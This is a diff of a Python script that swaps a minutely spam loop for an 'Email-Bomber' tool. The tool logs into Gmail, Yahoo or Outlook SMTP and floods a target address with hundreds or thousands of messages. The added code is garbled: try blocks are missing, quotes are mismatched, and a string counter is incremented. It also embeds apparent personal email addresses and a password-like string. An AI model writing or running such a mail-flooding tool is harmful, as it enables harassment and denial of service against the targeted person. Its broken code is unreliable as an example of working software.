@@ -1,37 +1,127 @@
-from ast import Str
+'''imports'''
 import smtplib
-import string
-import time
-import random
-from email.mime.text import MIMEText
-#Open a file for reading
-
-me = 'goalsinmind15@gmail.com' # change to your email
-p_reader = open('smith143','rb') # edit for your password
-cipher = p_reader.read()
-recipients = ['ashley.nicole0499@gmail.com'] # enter recipients here
+import sys
 
 
-def spamEveryMinute():
-    while (True):
-        fp = open('message.txt', 'rb')
-        #multipart class is for multiple recipients
-        msg = MIMEText(fp.read(), 'plain', 'utf-8')
-        fp.close()
+class bcolors:
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    RED = '\033[91m'
 
-        thread_number = random.randint(0, 10000)
-        msg['Subject'] = 'Header''Minutely Spam Report (randomizer: ' + str (thread_number + ')', 'utf-8')
-        msg['From'] = me
-        msg['To'] = 'ashley.nicole0499@gmail.com'.join(recipients)
 
-        s = smtplib.SMTP(host='smtp.gmail.com', port=587)
-        s.ehlo()
-        s.starttls()
-        s.ehlo()
-        s.login(me, cipher)
-        s.sendmail(me, recipients, msg.as_string())
+def banner():
+    print(bcolors.GREEN + '+[+[+[ Email-Bomber v1.0 ]+]+]+')
+    print(bcolors.GREEN + '+[+[+[ made with codes ]+]+]+')
+    print(bcolors.GREEN + '''
+                     \|/
+                       `--+--'
+                          |
+                      ,--'#`--.
+                      |#######|
+                   _.-'#######`-._
+                ,-'###############`-.
+              ,'#####################`,         .___     .__         .
+             |#########################|        [__ ._ _ [__) _ ._ _ |_  _ ._.
+            |###########################|       [___[ | )[__)(_)[ | )[_)(/,[
+           |#############################|
+           |#############################|              Author: w3w3w3
+           |#############################|
+            |###########################|
+             \#########################/
+              `.#####################,'
+                `._###############_,'
+                   `--..#####..--'                                 ,-.--.
+*.______________________________________________________________,' (Bomb)
+                                                                    `--' ''')
 
-        print ;'Email sent to: ashley.nicole0499@gmail.com+ ', 
-        s.quit()
-        time.sleep(10) # change rate of fire here
 
+class Email_Bomber:
+    count = '3'
+
+    def __init__ (self):
+    
+     
+            print(bcolors.RED + '\n+[+[+[ Initializing program ]+]+]+')
+            self.target = str;input(bcolors.GREEN + 'Willdog18@gmail.com'
+            self.mode = int(input (bcolors.GREEN + 'Enter BOMB mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) <: '3'))
+            if int(self.mode) > int(4) or int(self.mode) < int(1):
+                print('ERROR: Invalid Option. GoodBye.')
+                sys.exit(1)
+        except Exception as e:
+            print(f'ERROR: {e}')
+
+    def bomb(self):
+        
+            print(bcolors.RED + '\n+[+[+[ Setting up bomb ]+]+]+')
+            self.amount = None
+            if self.mode == int(1):
+                self.amount = int(1000)
+            elif self.mode == int(2):
+                self.amount = int(500)
+            elif self.mode == int(3):
+                self.amount = int(250)
+            else:
+                self.amount = int(input(bcolors.GREEN + 'Choose a CUSTOM amount <: '))
+            print(bcolors.RED + f'\n+[+[+[ You have selected BOMB mode: {self.mode} and {self.amount} emails ]+]+]+')
+        except Exception as e:
+            print(f'ERROR: {e}')
+
+    def email(self):
+        
+            print(bcolors.RED + '\n+[+[+[ Setting up email ]+]+]+')
+            self.server = str(input(bcolors.GREEN + 'Enter email server | or select premade options - 1:Gmail 2:Yahoo 3:Outlook <:'1:Gmail'))
+            premade = ['1', '2', '3']
+            default_port = True
+            if self.server not in premade:
+                default_port = False
+                self.port = int(input(bcolors.GREEN + 'Enter port number <:'1'))
+
+            if default_port == True:
+                self.port = int(587)
+
+            if self.server == '1':
+                self.server = 'smtp.gmail.com'
+            elif self.server == '2':
+                self.server = 'smtp.mail.yahoo.com'
+            elif self.server == '3':
+                self.server = 'smtp-mail.outlook.com'
+
+            self.fromAddr = str(input(bcolors.GREEN + 'Enter from address <:'goalsinmind15@gmail.com'))
+            self.fromPwd = str(input(bcolors.GREEN + 'Enter from password <:'smith143'))
+            self.subject = str(input(bcolors.GREEN + 'Enter subject <:'welcome to texas'))
+            self.message = str(input(bcolors.GREEN + 'Enter message <:'whats going on'))
+
+            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
+            ''' % (self.fromAddr, self.target, self.subject, self.message)
+
+            self.s = smtplib.SMTP(self.server, self.port)
+            self.s.ehlo()
+            self.s.starttls()
+            self.s.ehlo()
+            self.s.login(self.fromAddr, self.fromPwd)
+        except Exception as e:
+            print(f'ERROR: {e}')
+
+    def send(self):
+        
+            self.s.sendmail(self.fromAddr, self.target, self.msg)
+            self.count +=1
+            print(bcolors.YELLOW + f'BOMB: {self.count}')
+        except Exception as e:
+            print(f'ERROR: {e}')
+
+    def attack(self):
+        print(bcolors.RED + '\n+[+[+[ Attacking... ]+]+]+')
+        for email in range(self.amount+1):
+            self.send()
+        self.s.close()
+        print(bcolors.RED + '\n+[+[+[ Attack finished ]+]+]+')
+        sys.exit(0)
+
+
+if __name__=='__main__':
+    banner()
+    bomb = Email_Bomber()
+    bomb.bomb()
+    bomb.email()
+    bomb.attack()
